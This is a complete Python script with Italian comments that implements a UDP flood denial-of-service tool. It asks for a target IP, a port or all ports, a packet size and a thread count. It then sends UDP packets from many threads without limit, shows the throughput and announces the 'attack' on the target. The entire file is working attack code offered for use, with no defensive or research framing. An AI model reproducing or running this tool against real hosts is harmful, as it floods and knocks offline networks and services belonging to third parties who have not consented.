#!/usr/bin/env python3
from socket import socket, AF_INET, SOCK_DGRAM, create_connection
from threading import Thread
import os
from random import randint
from time import time, sleep
import msvcrt  # Per la pausa su Windows
import colorama
from colorama import Fore, Style

# Inizializza colorama
colorama.init(autoreset=True)

def check_internet_connection(host="8.8.8.8", port=53, timeout=3):
    """Verifica se c'è connessione a Internet tentando di connettersi a un server DNS pubblico."""
    try:
        create_connection((host, port), timeout)
        return True
    except OSError:
        return False

def clear_screen():
    """Pulisce il terminale."""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_divider(char='─', length=80, color=Fore.LIGHTBLUE_EX):
    """Stampa una linea divisoria decorativa."""
    print(color + char * length + Style.RESET_ALL)

def print_banner():
    """Stampa il banner ASCII in rosso."""
    banner = r"""
          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
                             ▐ ▄        ▌ ▐· ▄▄▄· 
                            •█▌▐█▪     ▪█·█▌▐█ ▀█ 
                            ▐█▐▐▌ ▄█▀▄ ▐█▐█•▄█▀▀█ 
                            ██▐█▌▐█▌.▐▌ ███ ▐█ ▪▐▌
                            ▀▀ █▪ ▀█▄▀▪. ▀   ▀  ▀ 
    """
    print(Fore.RED + banner + Style.RESET_ALL)

class UDPFlooder:
    """Classe per lanciare un attacco UDP Flood."""
    def __init__(self, ip, port, packet_size, thread_count):
        self.ip = ip
        self.port = port
        self.packet_size = packet_size
        self.thread_count = thread_count

        self.client = socket(AF_INET, SOCK_DGRAM)
        self.packet_data = b"x" * self.packet_size
        self.packet_length = len(self.packet_data)
        self.is_active = False
        self.sent_bytes = 0

    def start_flood(self):
        """Avvia l'attacco UDP."""
        self.is_active = True
        self.sent_bytes = 0
        for _ in range(self.thread_count):
            Thread(target=self.send_packets, daemon=True).start()
        Thread(target=self.monitor_traffic, daemon=True).start()

    def stop_flood(self):
        """Ferma l'attacco UDP."""
        self.is_active = False

    def send_packets(self):
        """Invia pacchetti UDP in loop."""
        while self.is_active:
            try:
                self.client.sendto(self.packet_data, (self.ip, self._get_random_port()))
                self.sent_bytes += self.packet_length
            except Exception as e:
                print(Fore.RED + f"Error sending packet: {e}" + Style.RESET_ALL)

    def _get_random_port(self):
        """Restituisce la porta specificata o una porta casuale."""
        return self.port if self.port else randint(1, 65535)

    def monitor_traffic(self):
        """Monitora e visualizza il traffico inviato."""
        interval = 0.05
        start_time = time()
        total_bytes_sent = 0
        while self.is_active:
            sleep(interval)
            current_time = time()
            if current_time - start_time >= 1:
                speed_mbps = self.sent_bytes * 8 / (1024 * 1024) / (current_time - start_time)
                total_bytes_sent += self.sent_bytes
                print(Fore.LIGHTBLUE_EX + f"Speed: {speed_mbps:.2f} Mb/s - Total: {total_bytes_sent / (1024 * 1024 * 1024):.2f} Gb" + Style.RESET_ALL, end='\r')
                start_time = current_time
                self.sent_bytes = 0

def get_input(prompt, default=None, cast_type=int):
    """Gestisce l'input dell'utente, con conversione e default."""
    value = input(Fore.LIGHTBLUE_EX + prompt + Style.RESET_ALL)
    if value == '':
        return default
    try:
        return cast_type(value)
    except ValueError:
        print(Fore.RED + f"Invalid input. Please enter a valid {cast_type.__name__}." + Style.RESET_ALL)
        return get_input(prompt, default, cast_type)

def wait_for_keypress():
    """Attende che l'utente prema un tasto per tornare alla schermata iniziale."""
    print(Fore.YELLOW + "\nPress any key to return to the main screen..." + Style.RESET_ALL)
    msvcrt.getch()  # Aspetta un input qualsiasi

def main():
    while True:
        clear_screen()
        print_banner()
        print_divider()
        print()  # Spazio extra dopo il banner

        # Input utente
        ip = input(Fore.LIGHTBLUE_EX + "Enter the target IP address: " + Style.RESET_ALL)
        if not ip.count('.') == 3:
            print(Fore.RED + "Error! Please enter a valid IP address." + Style.RESET_ALL)
            wait_for_keypress()
            continue

        port = get_input("Enter the target port (or press enter to target all ports): ", default=None, cast_type=int)
        packet_size = get_input("Enter the packet size in bytes (default is 1250): ", default=1250)
        thread_count = get_input("Enter the number of threads (default is 100): ", default=100)

        # Controllo connessione internet
        print(Fore.YELLOW + "\nChecking internet connection..." + Style.RESET_ALL)
        if check_internet_connection():
            print(Fore.GREEN + "Internet connection verified. Proceeding..." + Style.RESET_ALL)
        else:
            print(Fore.RED + "No internet connection detected! Exiting..." + Style.RESET_ALL)
            wait_for_keypress()
            continue  # Torna al menu principale

        flooder = UDPFlooder(ip, port, packet_size, thread_count)
        
        try:
            flooder.start_flood()
            print_divider()
            print(Fore.LIGHTBLUE_EX + f"Starting attack on {ip}:{port if port else 'all ports'}" + Style.RESET_ALL)
            print_divider()
            while True:
                sleep(1000000)
        except KeyboardInterrupt:
            flooder.stop_flood()
            print("\n" + Fore.RED + f"Attack stopped. Total data sent: {flooder.sent_bytes / (1024 * 1024 * 1024):.2f} Gb" + Style.RESET_ALL)
            print_divider()
            wait_for_keypress()

if __name__ == '__main__':
    main()
